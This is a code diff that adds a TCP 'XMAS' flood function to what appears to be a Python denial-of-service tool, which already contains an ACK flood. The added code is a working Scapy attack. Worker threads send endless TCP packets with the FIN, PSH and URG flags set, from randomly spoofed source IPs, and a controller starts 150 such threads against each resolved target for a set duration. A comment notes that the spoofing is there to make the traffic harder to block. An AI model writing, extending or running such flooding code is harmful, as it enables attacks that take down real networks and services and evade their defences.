@@ -731,3 +731,42 @@ def attack_ack_flood(target_url, port, duration, stop_event, pause_event, thread
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
+
+
+# --- NEW: TCP XMAS Flood ---
+def xmas_worker(stop_event, pause_event, target_ip, port, iface):
+    """
+    Worker thread that sends a continuous stream of TCP XMAS packets.
+    These packets have multiple flags set (FIN, PSH, URG) and are designed
+    to stress the TCP/IP stack of the target and its firewalls.
+    """
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            # Spoofing the source IP makes it harder to block.
+            spoofed_ip = generate_random_ip()
+
+            # The key is the flags='FPU' (FIN, PSH, URG) which lights the packet up "like a Christmas tree".
+            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='FPU')
+
+            send(packet, verbose=0, iface=iface)
+        except Exception:
+            pass
+
+def attack_xmas_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
+    """Controller for TCP XMAS flood attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(target=xmas_worker, args=(stop_event, pause_event, ip, port, iface))
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
